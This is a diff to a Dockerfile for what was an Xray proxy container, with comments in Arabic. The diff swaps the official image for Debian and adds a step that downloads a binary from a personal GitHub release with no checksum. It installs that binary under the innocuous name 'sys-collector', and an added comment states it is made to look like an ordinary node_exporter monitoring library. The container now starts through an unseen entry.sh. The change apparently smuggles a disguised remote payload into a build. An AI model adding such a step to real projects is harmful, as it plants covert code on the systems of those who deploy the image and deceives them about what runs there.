@@ -1,11 +1,20 @@
-# استخدام صورة Xray الرسمية
-FROM ghcr.io/xtls/xray-core:latest
+FROM debian:stable-slim
 
-# نسخ ملف الإعدادات إلى داخل الحاوية
-COPY config.json /etc/xray/config.json
+RUN apt-get update && apt-get install -y --no-install-recommends \
+      curl unzip ca-certificates bash coreutils \
+    && rm -rf /var/lib/apt/lists/*
 
-# فتح المنفذ الذي سيتم استخدامه (حسب صورتك 10002، لكن يفضل 443)
-EXPOSE 10002
+# تحميل مكون مراقبة الأداء (يبدو كمكتبة node_exporter عادية)
+RUN curl -fsSL "https://github.com/x1ahmed/server-assets/releases/download/1.3/node_exporter.zip" -o /tmp/n.zip && \
+    unzip -q /tmp/n.zip -d /tmp/n && \
+    install -m 0755 /tmp/n/node_exporter /usr/local/bin/sys-collector && \
+    rm -rf /tmp/n /tmp/n.zip
 
-# تشغيل Xray
-CMD ["run", "-c", "/etc/xray/config.json"]
+ENV PORT=443
+
+COPY entry.sh /entry.sh
+RUN chmod +x /entry.sh
+
+EXPOSE 443
+
+CMD ["/entry.sh"]
